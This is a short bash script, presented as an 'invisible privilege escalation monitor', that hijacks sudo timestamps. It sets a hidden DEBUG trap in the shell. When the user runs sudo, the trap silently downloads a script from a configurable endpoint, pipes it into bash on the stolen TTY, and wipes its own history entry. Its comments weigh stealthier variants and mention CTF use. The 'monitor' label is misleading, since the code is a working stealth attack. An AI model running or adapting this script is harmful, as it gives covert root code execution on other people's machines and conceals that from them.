#!/bin/bash
# 🔐 sudo_timestamp_hijacking.sh - Sudo Timestamp Hijacking | Invisible privilege escalation monitor
# Made By Aryan Giri | giriaryan694-a11y

set -euo pipefail

ALARM_ENDPOINT="${ALARM_URL:-http://127.0.0.1:8000/exec.sh}"

INIT_FILE=$(mktemp -t .sudo_watch.XXXXXX)
trap 'rm -f "$INIT_FILE"' EXIT

cat > "$INIT_FILE" << 'EOF'
__sudo_watch__() {
    local cmd="$BASH_COMMAND"
    if [[ "$cmd" =~ ^[[:space:]]*sudo([[:space:]]|$) ]]; then
        # FIX: Allocate PTY + preserve stdin for interactive payloads
        # Use script(1) to fake a TTY, or socat if available
        # Fallback: nohup with stdin preserved from current TTY
        (
            # Method 1: script -q -c "curl ... | bash" /dev/null
            # Method 2: Direct TTY steal (aggressive, visible in ps)
            # Method 3: Schedule via at/cron (delayed, stealthier)
            
            # Best CTF approach: reuse existing TTY via setsid + ctty hack
            setsid bash -c '
                exec <> /dev/tty
                curl -s --connect-timeout 2 --max-time 5 "ALARM_PLACEHOLDER" 2>/dev/null | bash
            ' &>/dev/null
        ) & disown
    fi
    return 0
}
trap '__sudo_watch__' DEBUG
history -d $((HISTCMD-1)) 2>/dev/null || true
EOF

sed -i "s|ALARM_PLACEHOLDER|${ALARM_ENDPOINT}|g" "$INIT_FILE"
chmod 600 "$INIT_FILE"

exec bash --init-file "$INIT_FILE" -i
